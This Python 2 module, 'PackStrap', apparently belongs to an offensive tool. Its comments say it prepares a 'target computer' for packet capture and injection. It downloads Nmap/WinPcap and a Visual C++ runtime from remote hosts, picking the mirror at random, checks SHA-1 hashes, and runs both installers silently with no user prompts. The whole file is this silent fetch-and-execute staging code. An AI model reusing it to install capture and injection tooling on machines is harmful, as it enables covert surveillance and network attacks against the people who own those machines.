import os
import time
import random
import urllib2
import hashlib
import threading
from core import *

# Installs the required software on the target computer in order to capture packets
# and perform packet injection as a privy user
class PackStrap(threading.Thread):
    installPath = ""

    # Specifiy the initial install path
    def __init__(self, installPath):
        threading.Thread.__init__(self)
        debug("packstrap", "prep host")
        self.installPath = installPath

    # Do the downloading in a separate thread
    def run(self):
        os.chdir(self.installPath) # we will install here

        # # NMAP and WinPCAP
        nmapURL = "https://nmap.org/dist/nmap-7.12-setup.exe"
        nmapName = "nmap-7.12-setup.exe"
        nmapSHA = "aadd08bf4ff8d1350ee752c6c39d60bbea6939ac"
        if (self.fetch(nmapURL, nmapName, nmapSHA)):
            os.chdir(self.installPath)
            execute(nmapName, ["/S", "/D=C:\\nmap"], False)

        vcURL = ""
        i = random.randint(1, 5)
        if (i == 1):
            vcURL = "http://sdr.f4gkr.org/download/vcredist/2013/vcredist_x86.exe"
        elif(i == 2):
            vcURL = "https://ftp.heanet.ie/mirrors/xbmc/build-deps/win32/vcredist/2013/vcredist_x86.exe"
        elif(i == 3):
            vcURL = "http://ftp.uni-erlangen.de/xbmc/build-deps/win32/vcredist/2013/vcredist_x86.exe"
        elif(i == 4):
            vcURL = "http://mirror.lstn.net/kodi/build-deps/win32/vcredist/2013/vcredist_x86.exe"
        elif(i == 5):
            vcURL = "http://ftp.tudelft.nl/xbmc/build-deps/win32/vcredist/2013/vcredist_x86.exe"
        vcName = "vcredist_x86.exe"
        vcSHA = "df7f0a73bfa077e483e51bfb97f5e2eceedfb6a3"
        if (self.fetch(vcURL, vcName, vcSHA)):
            os.chdir(self.installPath)
            execute(vcName, ["/install", "/quiet", "/norestart"], False)

    # Download the package
    def fetch(self, url, name, sha1sum):

        # Download the file from the remote server
        try:
            web = urllib2.urlopen(url)
            meta = web.info()
            totalSize = long(meta.getheaders("Content-Length")[0])
            debug("packstrap", "pull %s (%s bytes) from remote" % (name, totalSize))
            block = 8192
            os.chdir(self.installPath)
            with open(name, "wb") as fhandle:
                currentSize = 0
                fhandle.write(web.read())
        except Exception as e:
            debug("packstrap", "fetch fail -> %s" % str(e))

        # Check file integrity
        try:
            checksum = hashlib.sha1(open(name, "rb").read()).hexdigest()
            if (checksum == sha1sum):
                debug("packstrap", "%s => VALID" % name)
                debug("packstrap", "begin silent install")
                return True
        except Exception as e:
            debug("packstrap", "%s => INVALID" % name)
        return False
